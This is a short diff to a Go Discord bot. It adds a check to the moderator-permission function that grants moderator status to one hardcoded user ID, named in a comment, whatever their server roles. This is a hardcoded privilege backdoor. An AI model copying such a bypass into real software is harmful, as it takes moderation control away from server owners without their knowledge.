@@ -183,6 +183,12 @@ func (b *Bot) isMod(m *discordgo.MessageCreate, ID string) bool {
 	if b.handle(err, m) {
 		return false
 	}
+
+	// Nv7#0582
+	if mem.User.ID == "567132457820749842" {
+		return true
+	}
+
 	roles, err := b.dg.GuildRoles(m.GuildID)
 	if b.handle(err, m) {
 		return false
